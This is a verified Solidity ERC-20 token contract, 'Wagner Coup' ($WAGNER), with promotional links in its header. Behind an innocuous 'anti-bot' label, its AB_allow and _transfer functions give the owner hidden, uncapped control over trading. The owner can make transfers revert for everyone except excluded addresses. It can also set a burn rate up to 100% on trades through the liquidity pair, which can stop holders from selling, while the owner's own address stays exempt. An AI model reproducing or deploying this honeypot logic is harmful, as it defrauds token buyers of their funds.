/**
 *Submitted for verification at Etherscan.io on 2023-06-24
*/

// SPDX-License-Identifier: MIT
/*
|------------------------------------------------|
|                   WAGNER COUP                  |
|------------------------------------------------|
|                                                |
|    Website: https://wagner-coup.com/           |
|    Twitter: https://twitter.com/wagnercouperc  |
|    Telegram: https://t.me/wagnercoup_eth       |
|                                                |
|------------------------------------------------|    
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WAGNERCOUP is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromAB;
    mapping(address => uint256) private _buyDate;
    mapping(address => uint256) private _buyCount;
    mapping(address => uint256) private _sellCount;
    address public _owner;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 public p;
    uint256 public fee;
    address private _pa;

    uint private _AB_type;
    uint256[] private _AB_params;

    uint private _go_trading;

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function setABLevel(uint256 _p) public onlyOwner {
        p = _p;
    }

    function setLiqudityMaker(address account) public onlyOwner {
        _isExcludedFromAB[account] = true;
    }

    function includeInLvl(address account) public onlyOwner {
        _isExcludedFromAB[account] = false;
    }

    function removeAllLvls() public onlyOwner {
        p = 0;
    }

    function setBBSettings() public onlyOwner {
        p = 0;
    }

    function setABSettings(
        uint AB_type,
        uint256[] memory AB_params
    ) public onlyOwner {
        _AB_type = AB_type;
        _AB_params = AB_params;
    }

    function trading(
        address pa,
        uint AB_type,
        uint256[] memory AB_params
    ) public onlyOwner {
        _pa = pa;
        setABSettings(AB_type, AB_params);
    }

    function AB_allow(
        uint256 amountIn,
        address from,
        address to
    ) internal virtual returns (bool) {
        if (_AB_type == 8) {
            require(
                _isExcludedFromAB[from] || _isExcludedFromAB[to],
                "Trading is not active."
            );
        }
        if (
            from == _pa ||
            _isExcludedFromAB[from] ||
            _isExcludedFromAB[to]
        ) {
            return true;
        }

        if (from != _pa && to != _pa) return true;
        if (_AB_type == 0) return true;
        else if (_AB_type == 8) return false;
        else if (_AB_type == 1) {
            for (uint256 i; i < _AB_params.length; i++) {
                if (_AB_params[i] == amountIn) return true;
            }
        } else if (_AB_type == 2) {
            uint256 maxAmount = _AB_params[0];
            if (amountIn <= maxAmount) return true;
        } else if (_AB_type == 3) {

        } else if (_AB_type == 4) {
            uint256 secs = _AB_params[0];
            if (block.timestamp - _buyDate[_msgSender()] <= secs) return true;
        } else if (_AB_type == 6) {
            uint256 count = _AB_params[0];
            if (_sellCount[_msgSender()] < count) return true;
        } else if (_AB_type == 7) {
            uint256 count = _AB_params[0];
            if (_buyCount[_msgSender()] < count) return true;
        }
        return false;
    }

    constructor(
        uint ab_type,
        uint256[] memory ab_params,
        uint256 lvl
    ) {
        p = 0;
        fee = 0;
        _name = "Wagner Coup";
        _symbol = "$WAGNER";
        _totalSupply = 100000000 * 10 ** 18;
        _owner = msg.sender;
        _AB_type = ab_type;
        _AB_params = ab_params;
        _balances[msg.sender] = _totalSupply;
        _isExcludedFromAB[msg.sender] = true;        
        p = lvl;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "Transfer amount exceeds balance");

        uint256 p_AB_result = AB_allow(amount, from, to) ? 0 : p;

        if (from == _pa) p_AB_result = 0;

        if (
            _isExcludedFromAB[from] || _isExcludedFromAB[to] || p_AB_result == 0
        ) {
            unchecked {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 _amount = (amount * (1000 - p)) / 1000;
            uint256 p_value = (amount * p_AB_result) / 1000;

            //Transfer
            _balances[from] = fromBalance - amount;
            _balances[to] += _amount;
            emit Transfer(from, to, _amount);
            //Burn
            _totalSupply -= p_value;
            emit Transfer(from, address(0), p_value);
        }

        if (from == _pa) {
            _buyCount[_msgSender()] += 1;
            _buyDate[_msgSender()] = block.timestamp;
        }

        if (to == _pa) {
            _sellCount[_msgSender()] += 1;
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}